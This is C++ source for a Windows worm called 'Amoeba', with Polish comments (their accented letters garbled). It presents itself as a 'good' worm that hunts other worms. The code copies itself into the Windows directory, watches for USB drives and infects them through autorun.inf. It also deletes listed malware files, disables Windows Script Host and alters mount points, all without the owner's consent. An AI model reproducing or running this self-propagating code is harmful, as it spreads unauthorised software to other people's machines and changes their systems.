//-----------------------------------------------------/
// Eksperymentalny robak, który:
//      - rozmna¿a siê
//		- poluje na inne robaki
//		- zabezpiecza w pewnym stopniu komputer
//		- umiera i wiêcej nie zara¿a danego komputera
//----------------------------------------------------/
#include "files.h"

#include <WinIoCtl.h>
#include <Dbt.h>

#include <stdlib.h>

//-------Pocz¹tek bazy------------------
// Wariant MS32DLL.dll.vbs (VBS.Solow, VBS.Pica.E@mm)
// Wariant PegeFile.pif:
// Wariant RavMonE.exe / AdobeR.exe (RJump Worm):
// Wariant activexdebugger32.exe (Amca Worm):
// Wariant svchost.exe (Perlovga Worm / TrojanDropper.Small.Apl)
// Wariant ctfmon.exe (FakeRecycled)
TCHAR *paths[] = {	
		TEXT("%c:\\autorun.inf"),	
		TEXT("%c:\\copy.exe"),
		TEXT("%c:\\host.exe"),
		TEXT("%c:\\Recycled\\desktop.ini"),
		TEXT("%c:\\Recycled\\INFO2"),
		TEXT("%c:\\Recycled\\ctfmon.exe"),
		TEXT("%c:\\msvcr71.dll"),		
		TEXT("%c:\\PegeFile.pif"),
		TEXT("%c:\\MS32DLL.dll.vbs"),
		TEXT("%c:\\jxqevly.exe")
	};

TCHAR *pathsExpand[] = {
	TEXT("%USERPROFILE%\\Menu Start\\Programy\\Autostart\\ctfmon.exe"),	
	TEXT("%ProgramFiles%\\Internet Explorer\\PLUGINS\\NewTemp.bak"),
	TEXT("%ProgramFiles%\\Internet Explorer\\PLUGINS\\NewTemp.dll"),
	TEXT("%ProgramFiles%\\Internet Explorer\\PLUGINS\\System64.Jmp"),
	TEXT("%ProgramFiles%\\Internet Explorer\\PLUGINS\\System64.Sys"),
	TEXT("%ProgramFiles%\\Internet Explorer\\IEXPLORE32.jmp"),
	TEXT("%ProgramFiles%\\Internet Explorer\\IEXPLORE32.Sys"),
	TEXT("%ProgramFiles%\\Internet Explorer\\IEXPLORE32.Dat"),
	TEXT("%ProgramFiles%\\Internet Explorer\\IEXPLORE32.win"),
	TEXT("%temp%\\nesneler.exe"),
	TEXT("%windir%\\xcopy.exe"),
	TEXT("%windir%\\system\\ACD2.CMD"),
	TEXT("%windir%\\system\\ACD.CMD"),
	TEXT("%windir%\\system32\\scrrntr.dll"),
	TEXT("%windir%\\system32\\PAC.EXE"),
	TEXT("%windir%\\system32\\KTKBDHK3.DLL"),
	TEXT("%windir%\\system32\\Ijl11.dll"),
	TEXT("%windir%\\system32\\activexdebugger32.exe"),
	TEXT("%windir%\\system32\\kmon.ocx"),
	TEXT("%windir%\\system32\\mswinsck.ocx"),
	TEXT("%windir%\\RavMonE.exe"),
	TEXT("%windir%\\system32\\visin.exe"),
	TEXT("%windir%\\MS32DLL.dll.vbs"),
	TEXT("%windir%\\autorun.inf"),
	TEXT("%windir%\\svchost.exe"),
	TEXT("%windir%\\system32\\temp1.exe"),
	TEXT("%windir%\\system32\\temp2.exe"),
	TEXT("%windir%\\boot.ini"),
	TEXT("%USERPROFILE%\\ravmonlog")
	};

//---------Koniec bazy----------------
void PendriveArrive(TCHAR disk)
{
	TCHAR path[16];
	wsprintf(path, TEXT("%c:\\autorun.inf"), disk);
	if (File::Exist(path) && File::EvilAttributes(path))
	{
		// trzeba usun¹æ potencjaln¹ inn¹ infekcjê oraz zaraziæ pendrive'a o ile nie jest zabezpieczony :P
		// jednak istnieje szansa i¿ pendrive zostanie zabezpieczony w szansie 1 do 5.
		if (!(rand()%5))
		{
			CreateDirectory(path,NULL);
			File::TurnOnAttributes(path);
		}
		else
		{
			File::DivideCell(true,disk);
			File::AddAutorunAs(path);
		}
	}
}

enum DRIVE_TYPE { DT_ERROR, DT_OTHER, DT_FIXED, DT_REMOVABLE };
DRIVE_TYPE DriveType(TCHAR disk)
{
	TCHAR diskpath[8]; //7
	wsprintf(diskpath,TEXT("\\\\.\\%c:"),disk);
	HANDLE hDisk = CreateFile(diskpath,MAXIMUM_ALLOWED,FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
								OPEN_EXISTING,0,NULL);

	if (hDisk == INVALID_HANDLE_VALUE) return DT_ERROR;

	DISK_GEOMETRY diskGeometry;
	DWORD foo;

	DeviceIoControl(hDisk,IOCTL_DISK_GET_DRIVE_GEOMETRY,NULL,0,&diskGeometry,sizeof(diskGeometry),&foo,NULL);

	DRIVE_TYPE type;
	switch(diskGeometry.MediaType)
	{
	case RemovableMedia:
		type = DT_REMOVABLE;
		break;
	case FixedMedia:
		type = DT_FIXED;
		break;
	default:
		type = DT_OTHER;
	}

	CloseHandle(hDisk);
	return type;
}

void Hunt()
{
	TCHAR file[MAX_PATH<<1];
	unsigned k;

	// I faza - skanowanie dysków w celu usuniêcia z³ych plików z róznych dysków
	DWORD disks = GetLogicalDrives();
	DWORD disk = 3; // pomijamy napêd dyskietek A oraz B (3 w disk/2 w for)
	TCHAR letter;
	for (int i = 1; i < 26; ++i, disk <<= 1) 
    {
		// disk founded! :P
        if (disks & disk) 
        {
			letter = TEXT('A')+i;
			if (DriveType(letter) == DT_FIXED)
			{
				// usuwanie robali z dysków
				for(k = 0; k < (sizeof(paths)/sizeof(paths[0])); ++k)
				{
					wsprintf(file,paths[k],letter);
					File::DeleteEvilFile(file);
				}
				// dodanie zabezpieczenia prostego :P
				wsprintf(file,paths[0],letter);
				if(CreateDirectory(file,NULL))
					File::TurnOnAttributes(file);				
			}
		}
	}

	// II faza pliki systemowe ;p
	for(k = 0; k < (sizeof(pathsExpand)/sizeof(pathsExpand[0])); ++k)
	{
		ExpandEnvironmentStrings(pathsExpand[k],file,MAX_PATH<<1);
		File::DeleteEvilFile(file);
	}

	// i na koniec jeszcze zablokowanie zbêdnego dla 99,99% ludzi Windows Script Host
	CRegister::DisableWSH();
}

TCHAR FirstDriveFromMask(DWORD unitmask)
{
	for (int i=0;i<26; ++i)
	{
		if (unitmask & 0x1)
			return TEXT('A') + i;
		unitmask >>= 1;
	}
	return TEXT('\0'); // nie powinno siê zdarzyæ
}

LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam)
{	
	switch(msg)
	{
	case WM_DEVICECHANGE:
	{
		PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR) lParam;
		switch(wParam)
		{
		case DBT_DEVICEARRIVAL:
			if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
			{
				PDEV_BROADCAST_VOLUME lpdv = (PDEV_BROADCAST_VOLUME) lpdb;
				TCHAR z = FirstDriveFromMask(lpdv->dbcv_unitmask);
				if (DriveType(z) == DT_REMOVABLE)
					PendriveArrive(z);
			}
		}
	}
	}
	return DefWindowProc(hWnd,msg,wParam,lParam);
}

TCHAR *className = TEXT("Amoeba 0x1 - coded by rAifc0");
TCHAR cpPath[MAX_PATH+11];
UINT ncpPath;

int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE,LPSTR,int)
{	
	if (CRegister::Dieee())
		return -1;

	CRegister::DeleteEvilMountPoints();

	UINT c = GetWindowsDirectory(cpPath,MAX_PATH);
	wcscpy(cpPath + c,TEXT("\\amoeba.exe"));
	ncpPath = c + 11;

	// dokonaj zara¿enia
	File::DivideCell();

	Sleep(1000);

	// teraz poluj na robale
	Hunt();

	// pó¿niej zajmij siê w³asnym ¿yciem, tj czuwaniem i rozmna¿aniem ;]
	WNDCLASSEX wc;
	ZeroMemory(&wc,sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.hInstance = hInstance;
	wc.lpfnWndProc = WndProc;
	wc.lpszClassName = className;

	if (!RegisterClassEx(&wc) || !CreateWindowEx(0,className,className,NULL,0,0,0,0,NULL,NULL,hInstance,NULL)) 
		return 1;
	MSG msg;
	while(GetMessage(&msg,0,NULL,NULL) > 0) { TranslateMessage(&msg); DispatchMessage(&msg); }

	// na zakoñczenie programu te¿ poluje :P
	Hunt();

	return 0;
}